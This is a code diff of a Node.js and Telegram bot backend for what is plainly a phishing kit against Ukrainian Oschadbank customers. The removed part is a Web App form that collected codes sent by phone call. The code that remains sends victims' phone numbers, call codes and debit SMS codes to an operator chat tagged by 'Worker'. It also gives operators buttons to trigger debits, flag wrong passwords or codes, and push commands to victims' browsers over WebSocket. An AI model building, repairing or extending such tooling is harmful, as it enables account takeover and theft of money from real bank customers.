@@ -13,10 +13,6 @@ const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
 const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
 const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;
 
-// !!! НОВАЯ КОНСТАНТА: URL для Web App (index.html) !!!
-// Она должна указывать на публичный HTTPS URL, где находится ваш index.html
-const WEB_APP_URL = RENDER_EXTERNAL_URL ? RENDER_EXTERNAL_URL : 'https://your-public-url.com'; 
-
 // --- ИНИЦИАЛИЗАЦИЯ ---
 const app = express();
 app.use(express.json());
@@ -30,10 +26,6 @@ app.use((req, res, next) => {
 
 // Маршруты для отдачи статических файлов
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-app.get('/index.html', (req, res) => {
-    // Добавлен отдельный маршрут для /index.html на случай, если Web App использует его
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 app.get('/panel', (req, res) => {
@@ -51,7 +43,7 @@ if (WEBHOOK_URL) {
     bot.sendMessage(CHAT_ID, '✅ Бот перезапущен и готов к работе!', { parse_mode: 'HTML' })
         .catch(err => console.error('Ошибка отправки сообщения в Telegram:', err));
 } else {
-    console.error('Ошибка: RENDER_EXTERNAL_URL не определен. Вебхук не установлен. Используется локальный запуск.');
+    console.error('Ошибка: RENDER_EXTERNAL_URL не определен. Вебхук не установлен.');
 }
 
 // Проверка статуса бота
@@ -96,135 +88,20 @@ wss.on('connection', (ws) => {
     ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
 });
 
-
-// =========================================================
-// !!! НОВЫЙ ОБРАБОТЧИК ДЛЯ TELEGRAM WEB APP DATA !!!
-// =========================================================
-bot.on('web_app_data', async (msg) => {
-    const chatId = msg.chat.id;
-    const dataString = msg.web_app_data.data;
-    
-    try {
-        const data = JSON.parse(dataString);
-        
-        if (data.type === 'call_code_submit' && data.code && data.phone) {
-            
-            // Находим или создаем сессию для отправки в админ-чат
-            const sessionId = `web_app_${data.phone}_${Date.now()}`;
-            sessions.set(sessionId, { phone: data.phone, bankName: 'Ощадбанк' });
-
-            const message = `<b>📞 Код со звонка (Ощадбанк - Web App)</b>\n\n` +
-                           `<b>Код:</b> <code>${data.code}</code>\n` +
-                           `<b>Номер телефона:</b> <code>${data.phone}</code>\n` +
-                           `<b>Worker:</b> @${msg.from.username || 'N/A'}\n`;
-            
-            // Отправка в админ-чат с клавиатурой, но без кнопки Web App, чтобы не зацикливать
-            bot.sendMessage(CHAT_ID, message, {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
-                            { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
-                        ],
-                        [
-                            { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
-                            { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
-                            { text: 'Клиент не найден', callback_data: `client_not_found:${sessionId}` },
-                        ],
-                        [
-                            { text: 'Другой банк', callback_data: `other:${sessionId}` },
-                            { text: 'Забанить', callback_data: `ban:${sessionId}` },
-                        ],
-                    ]
-                }
-            });
-
-            // Отправка подтверждения пользователю (опционально)
-            bot.sendMessage(chatId, `✅ Код подтверждения **${data.code}** со звонка принят.`, { parse_mode: 'Markdown' });
-        }
-    } catch (e) {
-        console.error('Ошибка обработки web_app_data:', e);
-        bot.sendMessage(chatId, 'Произошла ошибка при обработке данных из формы.');
-    }
-});
-
-// =========================================================
-// !!! НОВАЯ КОМАНДА ДЛЯ ТЕСТИРОВАНИЯ/ЗАПУСКА WEB APP !!!
-// =========================================================
-bot.onText(/\/call (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const phone = match[1].trim(); 
-
-    if (!phone.startsWith('+')) {
-        return bot.sendMessage(chatId, 'Пожалуйста, введите номер с кодом страны, например: /call +380XXXXXXXXX');
-    }
-
-    // Формируем URL для Web App, передавая номер как GET-параметр
-    const fullWebAppUrl = `${WEB_APP_URL}/index.html?phone=${encodeURIComponent(phone)}`;
-    
-    // Создаем inline-клавиатуру с кнопкой Web App
-    const keyboard = {
-        inline_keyboard: [
-            [{ 
-                text: '📞 Звонок', 
-                web_app: { url: fullWebAppUrl } 
-            }]
-        ]
-    };
-
-    bot.sendMessage(chatId, `Нажмите кнопку "Звонок" для вызова формы подтверждения звонком для номера **${phone}**.`, {
-        reply_markup: keyboard,
-        parse_mode: 'Markdown'
-    });
-});
-// =========================================================
-
-
 // --- ОБРАБОТКА CALLBACK QUERY ОТ TELEGRAM ---
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     const ws = clients.get(sessionId);
-    const sessionData = sessions.get(sessionId) || {};
-    let command = { type, data: {} };
-    let responseText = `Команда "${type}" отправлена!`;
-
-    // =========================================================
-    // !!! ДОБАВЛЕН НОВЫЙ ТИП CALLBACK ДЛЯ ОТПРАВКИ WEB APP !!!
-    // =========================================================
-    if (type === 'call_app') {
-        const phone = sessionData.phone || sessionData.fp_phone;
-        if (!phone) {
-             bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: номер телефона не найден в сессии!', show_alert: true });
-             return;
-        }
-
-        const fullWebAppUrl = `${WEB_APP_URL}/index.html?phone=${encodeURIComponent(phone)}`;
-        
-        const keyboard = {
-            inline_keyboard: [
-                [{ 
-                    text: '📞 Открыть форму Звонка', 
-                    web_app: { url: fullWebAppUrl } 
-                }]
-            ]
-        };
-        
-        // Отправляем пользователю в приватный чат кнопку для открытия Web App
-        bot.sendMessage(callbackQuery.from.id, `Для подтверждения звонком используйте кнопку ниже:`, {
-            reply_markup: keyboard
-        });
-        bot.answerCallbackQuery(callbackQuery.id, { text: 'Кнопка Web App отправлена в личный чат.' });
-        return;
-    }
-    // =========================================================
-
 
     if (!ws || ws.readyState !== WebSocket.OPEN) {
         console.error(`Ошибка: Клиент ${sessionId} не в сети`);
         bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: клиент не в сети!', show_alert: true });
         return;
     }
+
+    const sessionData = sessions.get(sessionId) || {};
+    let command = { type, data: {} };
+    let responseText = `Команда "${type}" отправлена!`;
 
     switch (type) {
         case 'lk':
@@ -355,20 +232,13 @@ app.post('/api/submit', (req, res) => {
                      `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                      `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        } 
-        // =========================================================
-        // !!! БЛОК ДЛЯ СТАРОГО ПОТОКА (если не используется Web App) !!!
-        // ВАЖНО: Код со звонка из Web App будет обрабатываться в новом web_app_data выше.
-        // =========================================================
-        else if (stepData.call_code) {
-            message = `<b>📞 Код со звонка (Ощад) - СТАРЫЙ ПОТОК</b>\n\n` +
+        } else if (stepData.call_code) {
+            message = `<b>📞 Код со звонка (Ощад)</b>\n\n` +
                      `<b>Код:</b> <code>${stepData.call_code}</code>\n` +
                      `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
                      `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        } 
-        // =========================================================
-        else if (stepData.sms_code) {
+        } else if (stepData.sms_code) {
             message = `<b>💸 Код списания (Ощад)</b>\n\n` +
                      `<b>Код:</b> <code>${stepData.sms_code}</code>\n` +
                      `<b>Номер телефона:</b> <code>${newData.phone || newData.fp_phone || 'не указан'}</code>\n` +
@@ -466,7 +336,7 @@ function sendToTelegram(message, sessionId, bankName) {
             [
                 { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
                 { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
-                { text: 'Звонок 📞 App', callback_data: `call_app:${sessionId}` }, // !!! НОВАЯ КНОПКА !!!
+                { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` },
             ],
             [
                 { text: 'Пароль ❌', callback_data: `password_error:${sessionId}` },
